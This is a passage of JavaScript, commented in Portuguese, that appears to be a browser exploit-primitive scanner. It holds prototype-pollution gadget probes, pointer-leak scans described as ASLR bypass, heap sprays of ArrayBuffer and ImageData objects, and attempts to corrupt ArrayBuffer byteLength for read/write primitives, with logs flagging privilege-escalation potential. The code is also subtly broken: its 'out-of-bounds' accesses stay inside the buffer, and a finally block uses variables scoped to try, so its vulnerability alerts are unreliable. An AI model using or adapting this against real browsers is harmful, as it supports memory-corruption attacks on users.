                         logCanvas(`-> FAIL: Herança de '${prop}' não OK.`, 'good', FNAME);
                     }
                 } catch (e) {
                     logCanvas(`Erro ao poluir/testar '${prop}': ${e.message}`, 'error', FNAME);
                     errorMsg = e.message;
                 } finally {
                     // Limpeza / Restauração
                     try {
                         logCanvas(`  Limpando/Restaurando ${targetProtoName}.prototype.${prop}...`, 'info', FNAME);
                         if (wasDefined) {
                             targetProto[prop] = originalValue; // Tenta restaurar
                             logCanvas(`  -> Restaurado para valor original.`, 'info', FNAME);
                         } else {
                             delete targetProto[prop]; // Tenta deletar se não existia antes
                             logCanvas(`  -> Propriedade deletada.`, 'info', FNAME);
                         }
                         // Re-verificar limpeza (melhor esforço)
                         let checkObj = item.createTarget ? item.createTarget() : {};
                         if (checkObj[prop] === testValue) {
                            logCanvas(`  -> AVISO: Limpeza de '${prop}' falhou? Objeto ainda herda valor poluído.`, 'warn', FNAME);
                         }

                     } catch (e) {
                          logCanvas(`Erro ao limpar/restaurar '${prop}': ${e.message}`, 'error', FNAME);
                     }
                 }
                 await PAUSE(20); // Pausa curta entre propriedades
            }

            // Teste específico para input.value (fora do loop principal)
            let gadgetInputOK = false;
            const inputProp = 'value';
            const inputTargetProto = Object.prototype; // Ou HTMLInputElement.prototype? Testar Object primeiro.
            const inputProtoName = 'Object';
            try {
                logCanvas(`Testando gadget PP -> ${inputProtoName}.prototype.${inputProp}...`, 'subtest', FNAME);
                const originalInputValue = inputTargetProto[inputProp];
                 const wasInputValueDefined = Object.prototype.hasOwnProperty.call(inputTargetProto, inputProp);

                inputTargetProto[inputProp] = testValue; // Usar o mesmo testValue
                const input = document.createElement('input');
                logCanvas(`  Verificando herança em novo <input>. Valor: ${input.value}`, 'info', FNAME);
                if (input.value === testValue) {
                    logCanvas("-> GADGET VULN: PP afetou 'input.value'!", 'critical', FNAME);
                     logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para 'input.value'! ***`, 'escalation', FNAME);
                    gadgetInputOK = true;
                    successCount++; // Contar como sucesso de poluição
                    gadgetCount++;
                } else {
                    logCanvas("-> GADGET FAIL: PP não afetou 'input.value'.", 'good', FNAME);
                }
            } catch (e) {
                logCanvas(`Erro gadget input.value: ${e.message}`, 'error', FNAME);
            } finally {
                 try { // Limpeza input.value
                     if (wasInputValueDefined) inputTargetProto[inputProp] = originalInputValue;
                     else delete inputTargetProto[inputProp];
                 } catch (e) { logCanvas(`Erro limpar input.value: ${e.message}`, 'error', FNAME); }
            }

            logCanvas(`--- Teste PP Avançado Concluído (${successCount} propriedades poluídas com sucesso, ${gadgetCount} gadgets potenciais) ---`, 'test', FNAME);
            await PAUSE();
        };


        const testOOBReadEnhanced = async () => {
             const FNAME = 'testOOBReadEnhanced';
             logCanvas("--- Teste: OOB Read Enhanced Scan ---",'test', FNAME);
             const bufferSize=32;
             const readRangeStart=-128;
             const readRangeEnd=bufferSize+128;
             const allocationSize = bufferSize + 512; // Alocar buffer maior
             const baseOffsetInBuffer = 256; // Onde o buffer "útil" começa

             let potentialLeakFoundCount=0;
             const foundPointers=[]; // Armazenar leaks encontrados para log final

             logCanvas(`Config: bufferSize=${bufferSize}, scanRange=[${readRangeStart}, ${readRangeEnd}), allocationSize=${allocationSize}, baseOffsetInBuffer=${baseOffsetInBuffer}`, 'info', FNAME);

             try{
                 const buffer=new ArrayBuffer(allocationSize);
                 const dataView=new DataView(buffer);
                 logCanvas(`Buffer de ${buffer.byteLength} bytes alocado.`, 'info', FNAME);
                 // Preencher com padrão diferente do Script 1 para distinguir
                 for(let i=0; i<buffer.byteLength; i++){ dataView.setUint8(i, 0xCC); }
                 logCanvas(`Buffer preenchido com 0xCC.`, 'info', FNAME);

                 logCanvas(`Iniciando varredura OOB U32/U64 de ${readRangeStart} a ${readRangeEnd} (relativo a ${baseOffsetInBuffer})...`,'subtest', FNAME);

                 for(let readOffset=readRangeStart; readOffset<readRangeEnd; readOffset+=4){ // Passo de 4 bytes
                     const readTargetAddress=baseOffsetInBuffer+readOffset;
                     const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;

                     // Tentar ler U64
                     if(readTargetAddress>=0 && readTargetAddress+8<=buffer.byteLength){
                         try{
                             const low=dataView.getUint32(readTargetAddress,true);
                             const high=dataView.getUint32(readTargetAddress+4,true);

                             // Filtrar padrão de preenchimento
                             if (low === 0xCCCCCCCC && high === 0xCCCCCCCC) continue;

                             if(isPotentialPointer64_S2(high,low)){
                                 const valueStr=`H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`;
                                 logCanvas(` -> PTR? U64 ${relOffsetStr}: ${valueStr}`,'ptr', FNAME);
                                 potentialLeakFoundCount++;
                                 const leakInfo = {offset:readOffset, type:'U64', high, low, hex:valueStr};
                                 foundPointers.push(leakInfo);
                                  logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME);
                              } else if (low !== 0 || high !== 0) { // Logar outros valores não nulos
                                // logCanvas(` -> Data? U64 ${relOffsetStr}: H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`, 'info', FNAME);
                              }
                         }catch(e){ /* Ignorar erros esperados fora do buffer */ }
                     }
                     // Tentar ler U32 (se U64 não foi lido ou não era ponteiro no mesmo local)
                     else if(readTargetAddress>=0 && readTargetAddress+4<=buffer.byteLength){
                         try{
                             const val32=dataView.getUint32(readTargetAddress,true);

                             // Filtrar padrão de preenchimento
                              if (val32 === 0xCCCCCCCC) continue;

                             // Verificar se é um ponteiro 64 bits com high = 0
                              let alreadyLoggedAsPtr64 = foundPointers.some(p => p.offset === readOffset && p.type === 'U64');

                             if(!alreadyLoggedAsPtr64 && isPotentialData32_S2(val32) && !isPotentialPointer64_S2(0,val32)){
                                 logCanvas(` -> Leak U32? ${relOffsetStr}: ${toHexCanvas(val32,32)}`,'leak', FNAME);
                                 potentialLeakFoundCount++;
                                 const leakInfo = {offset:readOffset, type:'U32', value:val32, hex:toHexCanvas(val32)};
                                 foundPointers.push(leakInfo);
                                  logCanvas(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME); // Menor severidade
                              } else if (val32 !== 0 && !alreadyLoggedAsPtr64) {
                                // logCanvas(` -> Data? U32 ${relOffsetStr}: ${toHexCanvas(val32,32)}`, 'info', FNAME);
                              }
                         }catch(e){ /* Ignorar erros esperados */ }
                     }

                     if(readOffset % 64 === 0) await PAUSE(1); // Pausa para evitar travamento
                 }
             }catch(e){
                 logCanvas(`Erro fatal no Teste OOB Read Scan: ${e.message}`,'error', FNAME);
                 console.error(e);
             } finally {
                logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks potenciais encontrados) ---`,'test', FNAME);
                if(foundPointers.length > 0){
                    logCanvas(`-> ${foundPointers.length} leaks potenciais logados acima e no console.`, 'info', FNAME);
                     console.log("Potenciais Leaks Encontrados (OOB Read Enhanced):", foundPointers);
                } else {
                    logCanvas("Nenhum leak potencial óbvio encontrado nesta varredura.", 'good', FNAME);
                }
             }
             await PAUSE();
             return foundPointers;
        };

        const testOOBWriteMetadata = async () => {
            const FNAME = 'testOOBWriteMetadata';
            logCanvas("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME);
            const controlBufferSize=64;
            const targetBufferSize=64; // Tamanho dos buffers que queremos corromper
            const sprayCount=50; // Quantidade de buffers alvo para aumentar a chance de adjacência
            const targetValue=0x7FFFFFFE; // Novo tamanho desejado (grande, mas não máximo para evitar problemas)
            const targetBuffers=[];
            let controlBuffer=null;
            let dv=null;
            let writeSuccessCount = 0;
            let corruptionSuccess = false;
            const allocationSize = controlBufferSize + 256; // Buffer de controle maior
            const baseOffsetInBuffer = 128; // Onde o buffer de controle começa

            logCanvas(`Config: controlSize=${controlBufferSize}, targetSize=${targetBufferSize}, spray=${sprayCount}, targetLength=0x${targetValue.toString(16)}`, 'info', FNAME);

            try{
                logCanvas(`Alocando buffer de controle (${allocationSize}B)...`, 'info', FNAME);
                controlBuffer=new ArrayBuffer(allocationSize);
                dv=new DataView(controlBuffer);
                for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); // Padrão diferente
                logCanvas(`Buffer de controle alocado e preenchido com 0xDD.`, 'info', FNAME);
            }catch(e){
                logCanvas(`Erro fatal ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
                console.error(e);
                return;
            }

            logCanvas(`Pulverizando (spray) ${sprayCount} ArrayBuffers alvo (${targetBufferSize}B)...`, 'subtest', FNAME);
            for(let i=0; i<sprayCount; i++){
                try{
                    targetBuffers.push(new ArrayBuffer(targetBufferSize));
                }catch(e){
                    logCanvas(`Warn: Falha ao criar ArrayBuffer alvo ${i}: ${e.message}`, 'warn', FNAME);
                    // Continuar mesmo se alguns falharem
                }
            }
            logCanvas(`${targetBuffers.length} ArrayBuffers alvo criados.`, 'good', FNAME);
            await PAUSE();

            // Offsets relativos ao *fim* do buffer de controle onde o metadado (tamanho) do próximo buffer pode estar
            // Estes são valores comuns, mas podem variar entre motores JS e arquiteturas
            const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; // Adicionado offsets negativos e 0
            let foundOffset=-1;

            for(const tryOffset of metadataOffsetsToTry){
                 // Endereço absoluto dentro do buffer de controle onde tentaremos escrever
                 const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset;
                 const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
                 logCanvas(`Tentando OOB Write U32 @ ${relOffsetStr} (Valor=${toHexCanvas(targetValue)})...`, 'subtest', FNAME);

                 let currentWriteOK=false;
                 try{
                     // Verificar se o endereço está dentro do buffer de controle alocado
                     if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
                         dv.setUint32(targetWriteAddr, targetValue, true); // Escrever o tamanho alvo (little-endian)
                         logCanvas(`-> Escrita OOB U32 @ ${relOffsetStr} realizada.`, 'info', FNAME); // Não podemos confirmar vuln ainda
                         writeSuccessCount++;
                         currentWriteOK=true;
                     } else {
                         logCanvas(`-> Offset ${relOffsetStr} fora do buffer de controle alocado (${controlBuffer.byteLength}).`, 'warn', FNAME);
                     }
                 }catch(e){
                     logCanvas(`-> Escrita OOB U32 @ ${relOffsetStr} falhou: ${e.message}`, 'warn', FNAME);
                 }

                 if(currentWriteOK){
                     // Verificar se algum buffer alvo foi corrompido
                     logCanvas(`  Verificando ${targetBuffers.length} buffers alvo...`, 'info', FNAME);
                     for(let j=0; j<targetBuffers.length; j++){
                         try {
                             if(targetBuffers[j] && targetBuffers[j].byteLength === targetValue){
                                 logCanvas(`---> VULN: ArrayBuffer alvo ${j} teve seu byteLength CORROMPIDO para ${toHexCanvas(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME);
                                  logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Metadados OOB Write -> Read/Write Primitivo Poderoso) ***`, 'escalation', FNAME);
                                 corruptionSuccess=true;
                                 foundOffset=tryOffset;

                                 // Tentar usar o buffer corrompido para ler OOB
                                 try{
                                     const corruptedView=new DataView(targetBuffers[j]);
                                     // Tentar ler um pouco além do tamanho original
                                     const readOOBAddr = targetBufferSize + 4;
                                     const readOOBValue = corruptedView.getUint32(readOOBAddr, true);
                                     logCanvas(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr} (além do original ${targetBufferSize}): ${toHexCanvas(readOOBValue)}`, 'leak', FNAME);
                                      logCanvas(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME);
                                 }catch(eRead){
                                     logCanvas(`  -> Leitura OOB via AB ${j} corrompido falhou: ${eRead.message}`, 'warn', FNAME);
                                 }
                                 break; // Parar de verificar outros buffers se um foi encontrado
                             }
                         } catch(eCheck) {
                             logCanvas(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME);
                         }
                     }
                     // Restaurar valor no buffer de controle (melhor esforço) para não afetar próximos testes de offset
                     try{
                         if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
                             dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); // Restaurar padrão
                         }
                      }catch(eRestore){}
                 }

                 if(corruptionSuccess) break; // Parar de tentar outros offsets se a corrupção foi bem-sucedida
                 await PAUSE(10);
            } // Fim do loop de offsets

            if(corruptionSuccess){
                logCanvas(`SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`, 'vuln', FNAME);
            } else if(writeSuccessCount > 0){
                logCanvas(`Escrita OOB permitida em ${writeSuccessCount} offsets, mas byteLength de buffers alvo não foi corrompido (ou não detectado).`, 'warn', FNAME);
            } else{
                logCanvas(`Escrita OOB falhou/bloqueada em todos os offsets testados.`, 'good', FNAME);
            }
            logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME);
            await PAUSE();
            // Não retornar valor, apenas logar
        };


        const testWebGLDeeperPlus = async () => {
             const FNAME = 'testWebGLDeeperPlus';
             if(!glContext){
                 logCanvas("--- Teste: WebGL Deep Plus Pulado (WebGL N/A) ---",'test', FNAME);
                 return;
             }
             logCanvas(`--- Teste: WebGL Deep Plus c/ Checks (${isWebGL2?'WebGL2':'WebGL1'}) ---`,'test', FNAME);
             let gl=glContext;
             let pgm=null, buf=null, vs=null, fs=null, tex=null;
             let step='init';
             let glError=gl.NO_ERROR;
             const errors=[];
             const checkGLError=(s)=>{
                 let found=false;
                 while((glError=gl.getError())!==gl.NO_ERROR){
                    // Mapear erro numérico para string (melhor esforço)
                    let errorString = glError;
                    for(let key in gl) { if(gl[key] === glError) { errorString = key; break; } }
                    const eStr=`GL Err ${errorString} (0x${glError.toString(16)}) after ${s}`;
                    logCanvas(eStr,'error', FNAME);
                    errors.push(eStr);
                    found=true;
                 }
                 return !found; // Retorna true se NÃO houve erro
             };

             try{
                 logCanvas(`Contexto WebGL obtido: ${gl.getParameter(gl.VERSION)}`, 'good', FNAME);
                 checkGLError('getParam(VERSION)');

                 step='compileShaders';
                 logCanvas("Compilando Shaders...",'subtest', FNAME);
                 const vsSrc=`attribute vec4 p; void main(){ gl_Position = vec4(p.xy * 0.5, 0.0, 1.0); }`; // Shader simples
                 const fsSrc=`precision mediump float; uniform sampler2D u_tex; void main(){ gl_FragColor = texture2D(u_tex, vec2(0.5, 0.5)) * vec4(1.0, ${isWebGL2 ? '0.5' : '0.0'}, 0.0, 1.0); }`; // Amostra centro da textura, cor vermelha

                 vs=gl.createShader(gl.VERTEX_SHADER);
                 if(!vs || !checkGLError('createShader(VS)')) throw new Error('Falha criar VS');
                 gl.shaderSource(vs,vsSrc);
                 if(!checkGLError('shaderSource(VS)')) throw new Error('Falha source VS');
                 gl.compileShader(vs);
                 if(!checkGLError('compileShader(VS)')) throw new Error('Falha compile VS');
                 if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){
                     const infoLog = gl.getShaderInfoLog(vs);
                     logCanvas(`Erro Compilar VS: ${infoLog}`, 'error', FNAME);
                     throw new Error(`VS Compile: ${infoLog}`);
                 } else { logCanvas("Vertex Shader compilado OK.", 'info', FNAME); }

                 fs=gl.createShader(gl.FRAGMENT_SHADER);
                  if(!fs || !checkGLError('createShader(FS)')) throw new Error('Falha criar FS');
                 gl.shaderSource(fs,fsSrc);
                 if(!checkGLError('shaderSource(FS)')) throw new Error('Falha source FS');
                 gl.compileShader(fs);
                 if(!checkGLError('compileShader(FS)')) throw new Error('Falha compile FS');
                 if(!gl.getShaderParameter(fs,gl.COMPILE_STATUS)){
                     const infoLog = gl.getShaderInfoLog(fs);
                     logCanvas(`Erro Compilar FS: ${infoLog}`, 'error', FNAME);
                     throw new Error(`FS Compile: ${infoLog}`);
                 } else { logCanvas("Fragment Shader compilado OK.", 'info', FNAME); }

                 step='linkProgram';
                 logCanvas("Linkando Programa...", 'subtest', FNAME);
                 pgm=gl.createProgram();
                 if(!pgm || !checkGLError('createProgram')) throw new Error('Falha createProgram');
                 gl.attachShader(pgm,vs);
                 if(!checkGLError('attachVS')) throw new Error('Falha attachVS');
                 gl.attachShader(pgm,fs);
                 if(!checkGLError('attachFS')) throw new Error('Falha attachFS');
                 gl.linkProgram(pgm);
                 if(!checkGLError('linkProgram')) throw new Error('Falha linkProgram');
                 if(!gl.getProgramParameter(pgm,gl.LINK_STATUS)){
                     const infoLog = gl.getProgramInfoLog(pgm);
                     logCanvas(`Erro Linkar Programa: ${infoLog}`, 'error', FNAME);
                     throw new Error(`Link: ${infoLog}`);
                 } else { logCanvas("Programa linkado OK.", 'good', FNAME); }
                 gl.useProgram(pgm);
                 if(!checkGLError('useProgram')) throw new Error('Falha useProgram');

                 step='textureSetup';
                 logCanvas("Configurando Textura (do Canvas 2D)...",'subtest', FNAME);
                 tex=gl.createTexture();
                 if(!tex || !checkGLError('createTexture')) throw new Error('Falha createTexture');
                 gl.bindTexture(gl.TEXTURE_2D,tex);
                 if(!checkGLError('bindTexture')) throw new Error('Falha bindTexture');

                 // Desenhar algo simples no canvas 2D para usar como textura
                 if(ctx){
                     ctx.save();
                     ctx.fillStyle='lime'; ctx.fillRect(50,150,40,40);
                     ctx.fillStyle='black'; ctx.font='bold 12px mono'; ctx.fillText('TEX',55,175);
                     ctx.restore();
                     logCanvas("Desenhado no canvas 2D para textura.", 'info', FNAME);
                 } else {
                     logCanvas("Contexto 2D N/A para desenhar textura.", 'warn', FNAME);
                     // Criar textura programaticamente se ctx não estiver disponível? (ex: preencher com dados)
                 }
                 await PAUSE(20); // Pausa para garantir que o desenho 2D renderize

                 gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvasElement);
                 if(!checkGLError('texImage2D')) throw new Error('Falha texImage2D');
                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST);
                 if(!checkGLError('texParamMag')) throw new Error('Falha texParamMag');
                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST);
                 if(!checkGLError('texParamMin')) throw new Error('Falha texParamMin');
                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE);
                 if(!checkGLError('texParamWrapS')) throw new Error('Falha texParamWrapS');
                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE);
                 if(!checkGLError('texParamWrapT')) throw new Error('Falha texParamWrapT');
                 logCanvas("Textura criada do canvas e parâmetros definidos OK.", 'good', FNAME);

                 step='uniformTex';
                 const texLoc = gl.getUniformLocation(pgm, 'u_tex');
                 if(!checkGLError('getUniLocTex')) throw new Error('Falha getUniLocTex');
                 if(texLoc){
                     gl.uniform1i(texLoc, 0); // Usar unidade de textura 0
                     if(!checkGLError('uniform1i')) throw new Error('Falha uniform1i');
                     logCanvas("Uniform da textura (u_tex) configurado OK.", 'good', FNAME);
                 } else {
                     logCanvas("Uniform u_tex não encontrado no shader.", 'warn', FNAME);
                 }

                 step='createBufferDraw';
                 logCanvas("Criando Buffer e Desenhando Triângulo...",'subtest', FNAME);
                 buf=gl.createBuffer();
                 if(!buf || !checkGLError('createBuf')) throw new Error('Falha createBuf');
                 gl.bindBuffer(gl.ARRAY_BUFFER,buf);
                 if(!checkGLError('bindBuf')) throw new Error('Falha bindBuf');
                  // Triângulo que cobre parte do viewport GL
                 const pos=new Float32Array([-1,-1, 1,-1, -1, 1]); // Coordenadas x, y
                 gl.bufferData(gl.ARRAY_BUFFER, pos, gl.STATIC_DRAW);
                 if(!checkGLError('bufData')) throw new Error('Falha bufData');

                 step='vertexAttrib';
                 const loc=gl.getAttribLocation(pgm,"p"); // Obter localização do atributo 'p'
                 if (loc < 0) { // getAttribLocation retorna -1 se não encontrado
                     checkGLError('getAttribLoc(p)'); // Verificar erro mesmo se não encontrado
                     throw new Error("Atributo 'p' não encontrado no shader.");
                 }
                 if(!checkGLError('getAttribLoc(p)')) throw new Error('Falha getAttribLoc');
                 gl.enableVertexAttribArray(loc);
                 if(!checkGLError('enableVA')) throw new Error('Falha enableVA');
                  // Especificar como ler os dados do buffer: atributo 'loc', 2 componentes (xy), tipo FLOAT, não normalizado, stride 0, offset 0
                 gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
                 if(!checkGLError('vertexAttribPtr')) throw new Error('Falha vertexAttribPtr');

                 step='draw';
                 // Definir área de desenho para o WebGL (canto inferior direito do canvas)
                 const glViewportX = 250;
                 const glViewportY = 50; // Y é medido de baixo para cima no WebGL viewport
                 const glViewportW = 90;
                 const glViewportH = 90;
                 gl.viewport(glViewportX, glViewportY, glViewportW, glViewportH);
                 if(!checkGLError('viewport')) throw new Error('Falha viewport');
                 logCanvas(`Viewport GL definido para [${glViewportX}, ${glViewportY}, ${glViewportW}, ${glViewportH}]`, 'info', FNAME);

                 gl.clearColor(0.1, 0.1, 0.2, 1.0); // Cor de fundo azul escura
                 if(!checkGLError('clearColor')) throw new Error('Falha clearColor');
                 gl.clear(gl.COLOR_BUFFER_BIT);
                 if(!checkGLError('clear')) throw new Error('Falha clear');

                 gl.activeTexture(gl.TEXTURE0); // Ativar unidade de textura 0
                 if(!checkGLError('activeTex')) throw new Error('Falha activeTex');
                 gl.bindTexture(gl.TEXTURE_2D, tex); // Vincular nossa textura
                 if(!checkGLError('bindTexDraw')) throw new Error('Falha bindTexDraw');

                 gl.drawArrays(gl.TRIANGLES, 0, 3); // Desenhar 3 vértices (1 triângulo)
                 logCanvas(`Chamada gl.drawArrays(TRIANGLES, 0, 3) realizada.`, 'info', FNAME);
                 if(!checkGLError('drawArrays')) {
                     // Se drawArrays NÃO gerou erro, considerar um sucesso básico
                     logCanvas(`Desenho WebGL (triângulo texturizado?) executado SEM erros GL imediatos.`, 'good', FNAME);
                 } else {
                     throw new Error('Erro GL após drawArrays');
                 }

                 if(errors.length === 0){
                     logCanvas("Nenhum erro GL detectado durante a execução.",'good', FNAME);
                     // Se uma escrita OOB ocorreu antes, este sucesso pode ser mais interessante
                     // Adicionar verificação se OOB Write ocorreu antes? (requer passagem de estado)
                      // if (previousOOBWriteSuccess) { // Variável hipotética
                      //    logCanvas(` ---> *** ALERTA: Operações WebGL complexas concluídas sem erro após OOB Write! Investigar potencial interação. ***`, 'escalation', FNAME);
                      // }
                 } else {
                      logCanvas(`Total de ${errors.length} erros GL detectados durante a execução.`, 'warn', FNAME);
                 }

             }catch(e){
                 logCanvas(`Erro fatal durante Teste WebGL Deep Plus (etapa ${step}): ${e.message}`,'error', FNAME);
                 console.error(e);
                 checkGLError(`error_catch_${step}`); // Checar erros GL após exceção JS
             }finally{
                 // Limpeza de recursos WebGL
                 logCanvas("Limpando recursos WebGL...", 'info', FNAME);
                 if(gl){
                     try{gl.bindBuffer(gl.ARRAY_BUFFER,null);}catch(e){}
                     try{gl.bindTexture(gl.TEXTURE_2D,null);}catch(e){}
                     try{gl.useProgram(null);}catch(e){}
                     if(pgm && vs){try{gl.detachShader(pgm, vs);}catch(e){}}
                     if(pgm && fs){try{gl.detachShader(pgm, fs);}catch(e){}}
                     if(vs){try{gl.deleteShader(vs);}catch(e){logCanvas(`Erro ao deletar VS: ${e.message}`,'warn',FNAME)}}
                     if(fs){try{gl.deleteShader(fs);}catch(e){logCanvas(`Erro ao deletar FS: ${e.message}`,'warn',FNAME)}}
                     if(pgm){try{gl.deleteProgram(pgm);}catch(e){logCanvas(`Erro ao deletar Program: ${e.message}`,'warn',FNAME)}}
                     if(buf){try{gl.deleteBuffer(buf);}catch(e){logCanvas(`Erro ao deletar Buffer: ${e.message}`,'warn',FNAME)}}
                     if(tex){try{gl.deleteTexture(tex);}catch(e){logCanvas(`Erro ao deletar Texture: ${e.message}`,'warn',FNAME)}}
                     logCanvas("Limpeza WebGL concluída.", 'info', FNAME);
                 }
             }
             logCanvas("--- Teste WebGL Deep Plus Concluído ---",'test', FNAME);
             await PAUSE();
        };


        const testOOBWriteToImageDataCheck = async () => {
            const FNAME = 'testOOBWriteToImageDataCheck';
            logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME);
            const spraySize=30; // Reduzido para caber melhor na tela
            const imgDataWidth=10; // Pequeno para caber mais
            const imgDataHeight=10;
            const bufferOOBSize=64;
            const writeValue1=0x42424242; // BBBВ em little-endian (RGBA = 66, 66, 66, 66)
            const writeValue2=0x43434343; // CCCC em little-endian (RGBA = 67, 67, 67, 67)
            const writeValueSize = 8; // Escrevendo 2x U32 = 8 bytes
            const allocationSize = bufferOOBSize + 256;
            const baseOffsetInBuffer = 128;

            const sprayedImagesData = []; // Array para guardar os objetos ImageData
            let bufferOOB=null;
            let dv=null;
            let oobWritePerformed = false; // Indica se a escrita OOB foi *tentada* e *não falhou*
            let potentialCorruptionDetected = false; // Indica se *qualquer* corrupção foi vista
            let patternMatched = false; // Indica se o padrão específico escrito foi lido de volta

            logCanvas(`Config: spraySize=${spraySize}, imgSize=${imgDataWidth}x${imgDataHeight}, OOBWriteValue1=0x${writeValue1.toString(16)}, OOBWriteValue2=0x${writeValue2.toString(16)}`, 'info', FNAME);

            try{
                logCanvas(`Alocando buffer de controle OOB (${allocationSize}B)...`, 'info', FNAME);
                bufferOOB=new ArrayBuffer(allocationSize);
                dv=new DataView(bufferOOB);
                for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); // Padrão
                logCanvas(`Buffer de controle alocado e preenchido com 0xCC.`, 'info', FNAME);
            }catch(e){
                logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`,'error', FNAME);
                console.error(e);
                return;
            }

            logCanvas(`Pulverizando (spray) ${spraySize} objetos ImageData (${imgDataWidth}x${imgDataHeight})...`, 'subtest', FNAME);
            const initialPixelData = []; // Array para guardar os dados originais (todos brancos FF)
            const totalPixels = imgDataWidth * imgDataHeight;
            const initialByteArray = new Uint8ClampedArray(totalPixels * 4);
            for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; } // Branco FF

            for(let i=0; i<spraySize; i++){
                try{
                    // Criar ImageData com dados pré-definidos (branco)
                    let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight);
                    sprayedImagesData.push(imgData);
                }catch(e){
                    logCanvas(`Warn: Falha criar ImageData ${i}: ${e.message}`,'warn', FNAME);
                    break;
                }
            }
            logCanvas(`${sprayedImagesData.length} ImageData criados e inicializados (branco).`, 'good', FNAME);
            await PAUSE();

            // Calcular offset da escrita OOB
            const oobWriteOffset = bufferOOBSize; // Relativo ao início do buffer útil
            const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset;
            const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`;

            logCanvas(`Tentando escrita OOB U32x2 @ ${relOffsetStr}...`, 'subtest', FNAME);
            try{
                if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){
                    dv.setUint32(targetWriteAddr, writeValue1, true); // Little-endian
                    dv.setUint32(targetWriteAddr + 4, writeValue2, true); // Little-endian
                    logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME);
                     logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME);
                    oobWritePerformed = true;
                } else {
                    logCanvas(`Offset OOB ${relOffsetStr} fora do buffer de controle alocado.`, 'error', FNAME);
                }
            }catch(e){
                logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} falhou: ${e.message}`, 'warn', FNAME);
                // Continuar mesmo se a escrita falhar, para ver se algo estranho acontece
            }
            await PAUSE();

            if (oobWritePerformed) {
                 logCanvas(`Escrita OOB realizada. Verificando ${sprayedImagesData.length} ImageData via putImageData/getImageData...`, 'subtest', FNAME);
            } else {
                 logCanvas(`Escrita OOB não realizada ou falhou. Verificando ${sprayedImagesData.length} ImageData de qualquer maneira...`, 'subtest', FNAME);
            }

            if(ctx){
                // Limpar área do canvas onde as imagens serão desenhadas
                 ctx.fillStyle="#111"; // Fundo escuro para contraste
                 ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80);
                 logCanvas("Área do canvas limpa para exibição dos ImageData.", 'info', FNAME);
             } else {
                 logCanvas("Contexto 2D não disponível para put/getImageData. Verificação visual pulada.", 'warn', FNAME);
                 logCanvas("--- Teste OOB Write -> ImageData Check Concluído (Sem verificação visual) ---",'test', FNAME);
                 await PAUSE();
                 return; // Sair se não puder desenhar/ler
             }

             const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); // Calcular quantas imagens cabem na largura
             const startY = 60;

            for(let i=0; i<sprayedImagesData.length; i++){
                let corruptionRead=false;
                 let errorOccurred=false;
                 const gridX = 10 + (i % cols) * (imgDataWidth + 1); // Calcular posição X na grade
                 const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1); // Calcular posição Y na grade

                 // Verificar se cabe no canvas
                 if (gridY + imgDataHeight > canvasElement.height - 15) {
                     logCanvas(`ImageData ${i} fora da área visível do canvas, pulando desenho/verificação.`, 'info', FNAME);
                     continue;
                 }

                 try{
                    const currentImageData = sprayedImagesData[i];
                    if (!currentImageData) {
                        logCanvas(`ImageData ${i} é nulo/inválido, pulando.`, 'warn', FNAME);
                        continue;
                    }

                    // 1. Desenhar o ImageData atual no canvas
                    ctx.putImageData(currentImageData, gridX, gridY);

                    // 2. Ler de volta imediatamente do canvas
